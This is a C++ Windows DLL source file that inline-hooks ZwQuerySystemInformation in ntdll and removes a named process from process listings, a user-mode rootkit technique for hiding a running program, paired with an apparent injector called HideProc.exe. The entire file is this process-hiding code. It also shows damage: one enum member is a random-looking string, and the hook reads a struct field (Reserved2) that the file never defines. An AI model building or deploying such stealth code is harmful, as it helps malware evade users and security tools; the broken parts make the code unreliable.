// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "stdafx.h"
#include "windows.h"
#include "tchar.h"

#define STATUS_SUCCESS						(0x00000000L) 

typedef LONG NTSTATUS;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SXgi164MCGG3u5RKXaBGVBabmxQTVRAAVE5on = 8,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;
typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct __SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	LONG BasePriority;
	PVOID UniqueProcessId;
	PVOID InheritedFromUniqueProcessId;
	ULONG HandleCount;
	ULONG SessionId;
	ULONG_PTR UniqueProcessKey;
	ULONG_PTR PeakVirtualSize;
	ULONG_PTR VirtualSize;
	ULONG PageFaultCount;
	ULONG_PTR PeakWorkingSetSize;
	ULONG_PTR WorkingSetSize;
	ULONG_PTR QuotaPeakPagedPoolUsage;
	ULONG_PTR QuotaPagedPoolUsage;
	ULONG_PTR QuotaPeakNonPagedPoolUsage;
	ULONG_PTR QuotaNonPagedPoolUsage;
	ULONG_PTR PagefileUsage;
	ULONG_PTR PeakPagefileUsage;
	ULONG_PTR PrivatePageCount;
	LARGE_INTEGER ReadOperationCount;
	LARGE_INTEGER WriteOperationCount;
	LARGE_INTEGER OtherOperationCount;
	LARGE_INTEGER ReadTransferCount;
	LARGE_INTEGER WriteTransferCount;
	LARGE_INTEGER OtherTransferCount;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
(SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

#define DEF_NTDLL                       ("ntdll.dll")
#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")


// global variable (in sharing memory)
#pragma comment(linker, "/SECTION:.SHARE,RWS")
#pragma data_seg(".SHARE")
TCHAR g_szProcName[MAX_PATH] = { 0, };
#pragma data_seg()

// global variable
BYTE g_pOrgBytes[5] = { 0, };


BOOL hook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PROC pfnNew, PBYTE pOrgBytes)
{
	FARPROC pfnOrg;
	DWORD dwOldProtect, dwAddress;
	BYTE pBuf[5] = { 0xE9, 0, };
	PBYTE pByte;


	pfnOrg = (FARPROC)GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pfnOrg;


	if (pByte[0] == 0xE9)
		return FALSE;

	
	VirtualProtect((LPVOID)pfnOrg, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	
	memcpy(pOrgBytes, pfnOrg, 5);

	
	dwAddress = (DWORD)pfnNew - (DWORD)pfnOrg - 5;
	memcpy(&pBuf[1], &dwAddress, 4);

	
	memcpy(pfnOrg, pBuf, 5);


	VirtualProtect((LPVOID)pfnOrg, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


BOOL unhook_by_code(LPCSTR szDllName, LPCSTR szFuncName, PBYTE pOrgBytes)
{
	FARPROC pFunc;
	DWORD dwOldProtect;
	PBYTE pByte;

	
	pFunc = GetProcAddress(GetModuleHandleA(szDllName), szFuncName);
	pByte = (PBYTE)pFunc;

	
	if (pByte[0] != 0xE9)
		return FALSE;

	
	VirtualProtect((LPVOID)pFunc, 5, PAGE_EXECUTE_READWRITE, &dwOldProtect);

	
	memcpy(pFunc, pOrgBytes, 5);

	
	VirtualProtect((LPVOID)pFunc, 5, dwOldProtect, &dwOldProtect);

	return TRUE;
}


NTSTATUS WINAPI NewZwQuerySystemInformation(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength)
{
	NTSTATUS status;
	FARPROC pFunc;
	PSYSTEM_PROCESS_INFORMATION pCur, pPrev=NULL;
	char szProcName[MAX_PATH] = { 0, };


	unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION, g_pOrgBytes);

	pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
	pFunc = GetProcAddress(GetModuleHandleA(DEF_NTDLL),DEF_ZWQUERYSYSTEMINFORMATION);
	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
		(SystemInformationClass, SystemInformation,
			SystemInformationLength, ReturnLength);

	if (status != STATUS_SUCCESS)
		goto __NTQUERYSYSTEMINFORMATION_END;


	if (SystemInformationClass == SystemProcessInformation)
	{
		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
		while (TRUE)
		{
			if (pCur->Reserved2[1] != NULL)
			{		
				
				if (!_tcsicmp((PWSTR)pCur->Reserved2[1], g_szProcName))
				{
					if (pCur->NextEntryOffset == 0)
						pPrev->NextEntryOffset = 0;
					else
						pPrev->NextEntryOffset += pCur->NextEntryOffset;
				}
				else
					pPrev = pCur;
			}
	
			if (pCur->NextEntryOffset == 0)
				break;

			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
		}
		
	}

__NTQUERYSYSTEMINFORMATION_END:


	hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
		(PROC)NewZwQuerySystemInformation, g_pOrgBytes);

	return status;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	char            szCurProc[MAX_PATH] = { 0, };
	char            *p = NULL;

	GetModuleFileNameA(NULL, szCurProc, MAX_PATH);
	p = strrchr(szCurProc, '\\');
	if ((p != NULL) && !_stricmp(p + 1, "HideProc.exe"))
		return TRUE;

	switch (fdwReason)
	{
		// #2. API Hooking
	case DLL_PROCESS_ATTACH:
		
		hook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
			(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
		break;

		// #3. API Unhooking 
	case DLL_PROCESS_DETACH:
		unhook_by_code(DEF_NTDLL, DEF_ZWQUERYSYSTEMINFORMATION,
			g_pOrgBytes);
		break;
	}

	return TRUE;
}


#ifdef __cplusplus
extern "C" {
#endif
	__declspec(dllexport) void SetProcName(LPCTSTR szProcName)
	{
		_tcscpy_s(g_szProcName, szProcName);
	}
#ifdef __cplusplus
}
#endif
